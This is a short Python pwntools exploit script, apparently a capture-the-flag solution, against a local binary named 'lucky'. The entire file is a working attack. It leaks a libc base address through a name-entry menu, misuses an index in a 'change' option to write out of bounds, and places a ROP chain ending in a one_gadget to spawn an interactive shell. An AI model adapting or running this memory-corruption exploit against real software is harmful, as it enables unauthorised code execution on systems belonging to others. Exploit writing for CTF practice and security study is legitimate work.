#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './lucky')
libc = ELF(exe.libc.path)

def enter_name(name):
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b": ", name)
    io.sendlineafter(b": ", b"-")
    io.sendlineafter(b": ", b"-")
    io.sendlineafter(b": ", b"-")

def write_dword(data):
    low  = data & 0xffffffff
    high = (data >> 32) & 0xffffffff
    io.sendlineafter(b"number: ", str(low).encode())
    io.sendlineafter(b"number: ", str(high).encode())

io = process(exe.path)

enter_name(b'\x00')
io.recvuntil(b"ID is ")
libc.address = int(io.recvline().strip().decode()) - 0x1eb380

enter_name(b'\x00')

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"to change?", b"0")

enter_name(b'\x00'*40 + p64(18))
enter_name(b'\x00'*40 + p64(18))

io.sendlineafter(b"> ", b"2")
io.sendlineafter(b"to change?", b"18")

for i in range(0, 10):
  io.sendlineafter(b"number: ", b"0")

rop = ROP(libc)
write_dword(rop.find_gadget(['ret'])[0])
write_dword(rop.find_gadget(['pop r12', 'ret'])[0])
write_dword(0)
write_dword(libc.address + 0xe6c7e)

io.interactive()

